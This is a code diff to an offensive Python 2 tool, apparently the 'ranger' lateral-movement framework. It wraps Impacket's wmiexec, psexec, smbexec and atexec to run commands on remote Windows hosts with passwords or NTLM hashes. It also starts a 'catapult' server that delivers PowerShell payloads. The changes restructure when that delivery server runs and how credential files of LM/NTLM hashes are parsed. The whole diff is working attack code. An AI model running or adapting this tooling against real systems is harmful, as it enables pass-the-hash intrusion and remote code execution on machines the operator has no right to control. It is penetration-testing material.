@@ -2830,7 +2830,7 @@ class WmiexecRemoteShell(cmd.Cmd):
             self.execute_remote(line)
             if len(self.__outputBuffer.strip('\r\n')) > 0: 
                 # Something went wrong
-                print(self.__outputBuffer)
+                #print(self.__outputBuffer)
                 self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
@@ -2875,11 +2875,13 @@ class WmiexecRemoteShell(cmd.Cmd):
     def send_data(self, data):
         self.execute_remote(data)
         self.output = self.__outputBuffer
-        #print self.__outputBuffer
+        #print(self.__outputBuffer)
         self.__outputBuffer = ''
 
     def return_data(self):
-        return self.output
+        print("[*] Output for return") #DEBUG
+        print(self.output) #DEBUG
+        return(self.output)
 
 '''
 Author: Christopher Duffy
@@ -3365,10 +3367,6 @@ METHOD FUNCTIONS
 '''
 
 def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat):
-    srv = None
-    #if hash and not pwd:
-    #    print("[-] --atexec requires a password, please try a different user or crack hash %s for user %s") % (hash, usr)
-    #    return
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3382,9 +3380,6 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
     if command == "cmd.exe":
         sys.exit("[!] Please provide a viable command for execution")
     if attacks and encoder:
-        srv = delivery_server(src_port, cwd, delivery, share_name)
-        if not srv:
-            sys.exit("[!] To execute this attack the catapult server needs to start")
         with Timeout(timeout_value):
             try:
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = command, proto = protocol)
@@ -3393,14 +3388,8 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occured: %s") % (e)
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 return
     elif attacks and not encoder:
-        srv = delivery_server(src_port, cwd, delivery, share_name)
-        if not srv:
-            sys.exit("[!] To execute this attack the catapult server needs to start")
         with Timeout(timeout_value):
             try:
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
@@ -3409,9 +3398,6 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occured: %s") % (e)
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 return
     else:         
         with Timeout(timeout_value):
@@ -3422,16 +3408,9 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occured: %s") % (e)
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 return
-    if srv:
-       srv.terminate()
-       print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
 
 def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
-    srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3439,10 +3418,7 @@ def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 print("[-] Host %s port %s is closed") % (dst, verify_port)
             return #replaced continue inside a function 
     if attacks:
-        #print(instructions)
-        srv = delivery_server(src_port, cwd, delivery, share_name)
-        if not srv:
-            sys.exit("[!] To execute this attack the catapult server needs to start")
+        print(instructions)
     if hash:
         print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
     else:
@@ -3452,16 +3428,9 @@ def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
         shell.run(dst)
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occured: %s") % (e)
-        if srv:
-            srv.terminate()
-            print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
         return
-    if srv:
-        srv.terminate()
-        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
 def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
-    srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3470,9 +3439,6 @@ def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             return #replaced continue inside a function
     if attacks:
         print(instructions)
-        srv = delivery_server(src_port, cwd, delivery, share_name)
-        if not srv:
-            sys.exit("[!] To execute this attack the catapult server needs to start")
     if hash:
         print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
     else:
@@ -3482,16 +3448,9 @@ def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
         shell.run(dst)
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occured: %s") % (e)
-        if srv:
-            srv.terminate()
-            print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
         return
-    if srv:
-        srv.terminate()
-        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
 def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat):
-    srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3507,18 +3466,12 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
             try:
-                srv = delivery_server(src_port, cwd, delivery, share_name)
-                if not srv:
-                    sys.exit("[!] To execute this attack the catapult server needs to start")
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                 return #replaced continue inside a function
     elif attacks and not encoder:
@@ -3530,18 +3483,12 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
             try:
-                srv = delivery_server(src_port, cwd, delivery, share_name)
-                if not srv:
-                    sys.exit("[!] To execute this attack the catapult server needs to start")
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                 return #changed from continue inside a function
     elif attacks:
@@ -3553,18 +3500,12 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         with Timeout(timeout_value):
             try:
-                srv = delivery_server(src_port, cwd, delivery, share_name)
-                if not srv:
-                    sys.exit("[!] To execute this attack the catapult server needs to start")
-                    shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    shell.run(dst)
-                    data = shell.return_data()
-                    output_handler(logger_obj, output_cat, data, dst, verbose)
+                shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                shell.run(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                 return # changed from continue inside a function
     else:
@@ -3581,9 +3522,6 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 data = shell.return_data()
                 output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                 print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                 return # changed from continue inside a function
 
@@ -4130,7 +4068,7 @@ Create Pasteable Executor Attack:
     NTLM_temp = ""
     output_cat = {}
 
-    if invoker or downloader:
+    if invoker or downloader or executor:
         powershell = True
 
     if atexec_cmd and powershell and encoder:
@@ -4142,7 +4080,7 @@ Create Pasteable Executor Attack:
     if psexec_cmd and powershell:
         sys.exit("[!] Impacket's psexec does not function appropriately with PowerShell at this time")
 
-    if smbexec_cmd and command:
+    if smbexec_cmd and command != "cmd.exe":
         sys.exit("[!] smbexec is used for semi-interactive shells only at this time, try wmiexec, psexec, or atexec instead to run the command")
 
     # Configure logger formats for STDERR and output file
@@ -4204,7 +4142,7 @@ Create Pasteable Executor Attack:
                         temp_list = creds_dict[temp_key]
                         temp_list[0] = SID_temp
                         temp_list[1] = LM_temp
-		    if LM_temp == ":":
+		    if LM_temp == ":" or LM_temp == "" or LM_temp == " ":
 		        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp    
@@ -4221,7 +4159,7 @@ Create Pasteable Executor Attack:
                         temp_list = creds_dict[temp_key]
                         temp_list[0] = SID_temp
                         temp_list[1] = LM_temp
-		    if LM_temp == ":":
+                    if LM_temp == ":" or LM_temp == "" or LM_temp == " ":
 		        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp
@@ -4240,7 +4178,7 @@ Create Pasteable Executor Attack:
                         temp_list = creds_dict[temp_key]
                         temp_list[0] = SID_temp
                         temp_list[1] = LM_temp
-		    if LM_temp == ":":
+                    if LM_temp == ":" or LM_temp == "" or LM_temp == " ":
 		        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp
@@ -4251,6 +4189,7 @@ Create Pasteable Executor Attack:
                     usr_temp, pwd_temp, dom_temp = cred.sploit(' ')
                     temp_key = "%s\%s" % (dom_temp, usr_temp)
             elif cred.count(' ') == 1:
+                #print(cred) #DEBUG
                 cred = cred.rstrip()
                 dom_temp = dom
                 if "WORKGROUP" not in dom:
@@ -4258,22 +4197,40 @@ Create Pasteable Executor Attack:
                 usr_temp, pwd_temp = cred.split(' ')
                 temp_key = "%s\%s" % (dom_temp, usr_temp)
                 if not usr_temp:
-                    sys.exit("[!] Hash %s does not have a username") % (hash_temp)
+                    sys.exit("[!] Cred %s does not have a username") % (cred)
                 if temp_key in creds_dict:
                     temp_list = creds_dict[temp_key]
                     temp_list[4] = usr_temp
                     temp_list[5] = pwd_temp
+                    creds_dict[temp_key] = temp_list
                 else:
+                    SID_temp = None
+                    LM_temp = None
+                    NTLM_temp = None
+                    hash_temp = None
                     creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
             elif cred.count(' ') == 2:
                 cred = cred.rstrip()
                 usr_temp, pwd_temp, dom_temp = cred.split(' ')
                 if "WORKGROUP" not in dom:
-                   dom_temp = dom
+                    dom_temp = dom
                 temp_key = "%s\%s" % (dom_temp, usr_temp)
-                creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                if temp_key in creds_dict:
+                    temp_list = creds_dict[temp_key]
+                    temp_list[4] = usr_temp
+                    temp_list[5] = pwd_temp
+                    temp_list[6] = dom_temp
+                    creds_dict[temp_key] = temp_list
+                else:
+                    SID_temp = None
+                    LM_temp = None
+                    NTLM_temp = None
+                    hash_temp = None
+                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
             else:
                 sys.exit("[!] An error occured trying to parse the credential file")
+    
+    #print(creds_dict) #DEBUG
 
     if smbexec_cmd:
         verify_port, verify_service = protocol.split('/')
@@ -4531,18 +4488,41 @@ Create Pasteable Executor Attack:
     if not final_targets and not execution:
         sys.exit("[!] No targets to exploit or commands to provide")
 
-    if creds_dict:
-        for key, value in creds_dict.iteritems():
-            SID = value[0]
-            LM = value[1]
-            NTLM = value[2]
-            hash = value[3]
-            usr = value[4]
-            pwd = value[5]
-            dom = value[6]
+    if powershell and not downloader:
+        try:
+            srv = delivery_server(src_port, cwd, delivery, share_name)
+            if not srv:
+                sys.exit("[!] To execute this attack the catapult server needs to start")
+            if creds_dict:
+                for key, value in creds_dict.iteritems():
+                    SID = value[0]
+                    LM = value[1]
+                    NTLM = value[2]
+                    hash = value[3]
+                    usr = value[4]
+                    pwd = value[5]
+                    dom = value[6]
+                    method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
+            else:
+                method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
+        except (Exception, KeyboardInterrupt), e:
+            print("[!] An error occurred: %s") % (e)
+            if srv:
+                srv.terminate()
+                print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+    else:
+        if creds_dict:
+            for key, value in creds_dict.iteritems():
+                SID = value[0]
+                LM = value[1]
+                NTLM = value[2]
+                hash = value[3]
+                usr = value[4]
+                pwd = value[5]
+                dom = value[6]
+                method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
+        else: 
             method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
-    else: 
-        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
 
 
 if __name__ == '__main__':
